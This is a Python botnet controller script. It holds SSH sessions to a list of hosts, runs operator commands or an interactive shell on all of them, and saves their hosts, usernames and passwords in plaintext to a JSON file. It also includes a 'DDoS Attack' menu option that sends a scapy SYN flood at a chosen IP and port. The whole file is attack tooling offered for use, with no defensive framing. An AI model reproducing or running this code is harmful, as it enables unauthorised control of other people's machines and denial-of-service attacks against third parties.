import paramiko
import json
import os
from colorama import init, Fore
from scapy.all import IP, TCP, send

init(autoreset=True)

botnet = []

def connect_ssh(host, user, password, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, username=user, password=password, port=port, timeout=5)
        print(Fore.GREEN + f"[+] Connected to {host}")
        return {"session": ssh, "host": host, "user": user, "password": password, "port": port}
    except Exception as e:
        print(Fore.RED + f"[-] Connection failed for {host}: {e}")
        return None

def send_command(bot, command):
    try:
        stdin, stdout, stderr = bot["session"].exec_command(command)
        return stdout.read().decode()
    except Exception as e:
        return f"Error: {e}"

def add_client():
    host = input("Host: ")
    user = input("Username: ")
    password = input("Password: ")
    port = int(input("Port (default 22): ") or 22)
    bot = connect_ssh(host, user, password, port)
    if bot:
        botnet.append(bot)

def command_for_all():
    command = input("Enter command to run: ")
    for bot in botnet:
        output = send_command(bot, command)
        print(Fore.YELLOW + f"[{bot['host']}] >> {output}")

def bash():
    while True:
        cmd = input("Bash$ ")
        if cmd.lower() in ["exit", "quit"]:
            break
        for bot in botnet:
            output = send_command(bot, cmd)
            print(Fore.YELLOW + f"[{bot['host']}] >> {output}")

def save_botnet():
    data = [{"host": b["host"], "user": b["user"], "password": b["password"], "port": b["port"]} for b in botnet]
    with open("botnet.json", "w") as f:
        json.dump(data, f)

def load_botnet():
    if not os.path.exists("botnet.json"):
        return
    with open("botnet.json", "r") as f:
        data = json.load(f)
        for bot in data:
            loaded = connect_ssh(bot["host"], bot["user"], bot["password"], bot["port"])
            if loaded:
                botnet.append(loaded)

def perform_ddos():
    target_ip = input("Target IP: ")
    port = int(input("Target Port: "))
    for i in range(100):
        ip = IP(dst=target_ip)
        tcp = TCP(sport=12345+i, dport=port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)
    print(Fore.RED + "[!] DDoS SYN flood sent.")

def list_bots():
    for i, bot in enumerate(botnet):
        print(f"{i+1}. {bot['host']}")

def display_menu():
    print(Fore.CYAN + "\n====== SSH Botnet Menu ======")
    print("1. List Bots")
    print("2. Run Command on All Bots")
    print("3. Interactive Bash Shell")
    print("4. Add Bot")
    print("5. DDoS Attack")
    print("6. Save Botnet")
    print("7. Exit")

def main():
    load_botnet()
    while True:
        display_menu()
        choice = input("Choice: ")
        if choice == "1":
            list_bots()
        elif choice == "2":
            command_for_all()
        elif choice == "3":
            bash()
        elif choice == "4":
            add_client()
        elif choice == "5":
            perform_ddos()
        elif choice == "6":
            save_botnet()
        elif choice == "7":
            save_botnet()
            print("Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()
